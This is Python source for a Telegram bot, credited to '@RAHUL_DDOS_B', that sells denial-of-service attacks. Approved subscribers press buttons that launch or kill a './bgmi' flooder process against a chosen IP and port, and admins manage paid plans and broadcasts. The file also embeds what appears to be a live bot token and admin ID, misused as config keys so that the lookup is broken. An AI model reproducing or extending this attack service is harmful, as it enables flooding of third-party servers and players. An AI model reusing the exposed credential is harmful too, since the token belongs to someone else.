import time
import requests
import logging
from threading import Thread
import json
import hashlib
import os
import telebot
import subprocess
from datetime import datetime, timedelta

# Constants
CREATOR = "This File Is Made By @RAHUL_DDOS_BRAHUL_DDOS_B"
HASH_FILE = 'developer.txt'
EXPECTED_HASH_FILE = 'attack.txt'

def verify():
    try:
        # Ensure watermark file exists
        if not os.path.exists(HASH_FILE):
            raise FileNotFoundError(f"Verification file '{HASH_FILE}' is missing.")
        
        # Ensure expected hash file exists
        if not os.path.exists(EXPECTED_HASH_FILE):
            raise FileNotFoundError(f"Expected hash file '{EXPECTED_HASH_FILE}' is missing.")
        
        # Read and compute hash
        with open(HASH_FILE, 'r') as file:
            watermark_text = file.read().strip()
        computed_hash = hashlib.sha256(watermark_text.encode()).hexdigest()
        
        # Read the stored hash
        with open(EXPECTED_HASH_FILE, 'r') as file:
            stored_hash = file.read().strip()
        
        # Compare hashes
        if computed_hash != stored_hash:
            raise Exception("Verification failed: Hash mismatch.")
        
        print("Verification passed: This File Is Made By @RAHUL_DDOS_B.")
    except Exception as e:
        logging.error(f"Verification error: {e}")
        raise

# Run verification at startup
verify()

# Load configuration
with open('config.json') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config['8112795608:AAGVJMRik8S9XU2C5Ho2SLzIwSwXeGWHphs']
ADMIN_IDS = config['1661744209']

bot = telebot.TeleBot(BOT_TOKEN)

# File paths
USERS_FILE = 'users.txt'
USER_ATTACK_FILE = "user_attack_details.json"

def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    users = []
    with open(USERS_FILE, 'r') as f:
        for line in f:
            try:
                user_data = json.loads(line.strip())
                users.append(user_data)
            except json.JSONDecodeError:
                logging.error(f"Invalid JSON format in line: {line}")
    return users

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        for user in users:
            f.write(f"{json.dumps(user)}\n")

# Initialize users
users = load_users()

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Load existing attack details from the file
def load_user_attack_data():
    if os.path.exists(USER_ATTACK_FILE):
        with open(USER_ATTACK_FILE, "r") as f:
            return json.load(f)
    return {}

# Save attack details to the file
def save_user_attack_data(data):
    with open(USER_ATTACK_FILE, "w") as f:
        json.dump(data, f)

# Initialize the user attack details
user_attack_details = load_user_attack_data()

# Initialize active attacks dictionary
active_attacks = {}

# Function to check if a user is an admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Function to check if a user is approved
def check_user_approval(user_id):
    for user in users:
        if user['user_id'] == user_id and user['plan'] > 0:
            return True
    return False

# Send a not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

# Run attack command synchronously
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./bgmi", target_ip, str(target_port), "1", "25"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[(target_ip, target_port)] = process.pid
    elif action == 2:
        pid = active_attacks.pop((target_ip, target_port), None)
        if pid:
            try:
                subprocess.run(["kill", str(pid)], check=True)
            except subprocess.CalledProcessError as e:
                logging.error(f"Failed to kill process with PID {pid}: {e}")

# Buttons
btn_attack = telebot.types.KeyboardButton("Attack")
btn_start = telebot.types.KeyboardButton("Start Attack 🚀")
btn_stop = telebot.types.KeyboardButton("Stop Attack")

markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
markup.add(btn_attack, btn_start, btn_stop)

# Start and setup commands
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_user_approval(user_id):
        send_not_approved_message(message.chat.id)
        return

    username = message.from_user.username
    welcome_message = (f"Welcome, {username}!\n\n"
                       f"Please choose an option below to continue.")

    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

@bot.message_handler(commands=['approve_list'])
def approve_list_command(message):
    try:
        if not is_user_admin(message.from_user.id):
            send_not_approved_message(message.chat.id)
            return

        approved_users = [user for user in users if user['plan'] > 0]

        if not approved_users:
            bot.send_message(message.chat.id, "No approved users found.")
        else:
            response = "\n".join([f"User ID: {user['user_id']}, Plan: {user['plan']}, Valid Until: {user['valid_until']}" for user in approved_users])
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in approve_list command: {e}")

# Broadcast Command
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split(maxsplit=1)

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /broadcast <message>*", parse_mode='Markdown')
        return

    broadcast_msg = cmd_parts[1]

    for user in users:
        if user['plan'] > 0:
            try:
                bot.send_message(user['user_id'], broadcast_msg, parse_mode='Markdown')
            except telebot.apihelper.ApiException as e:
                logging.error(f"Failed to send message to user {user['user_id']}: {e}")

    bot.send_message(chat_id, "*Broadcast message sent to all approved users.*", parse_mode='Markdown')

# Function to run the bot continuously
def run_bot():
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            logging.error(f"Bot polling failed: {str(e)}")
            time.sleep(15)

if __name__ == '__main__':
    try:
        run_bot()
    except KeyboardInterrupt:
        logging.info("Bot stopped by user.")
